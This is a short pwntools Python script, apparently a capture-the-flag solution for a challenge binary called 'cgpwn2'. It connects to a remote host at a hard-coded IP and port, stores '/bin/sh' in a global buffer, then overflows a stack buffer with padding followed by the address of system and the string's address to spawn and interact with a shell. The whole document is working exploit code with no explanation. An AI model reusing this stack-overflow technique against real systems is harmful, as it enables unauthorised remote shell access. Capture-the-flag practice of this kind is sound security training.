from pwn import *

# p = process("./cgpwn2")
p = remote("111.198.29.45" , 30310)
elf = ELF("./cgpwn2")

p.sendlineafter("name\n" , "/bin/sh\x00")
p.sendlineafter("here:\n" , "a" * 0x26 + "b" * 4 + p32(elf.plt["system"]) + "b" * 4 + p32(0x0804A080))

p.interactive()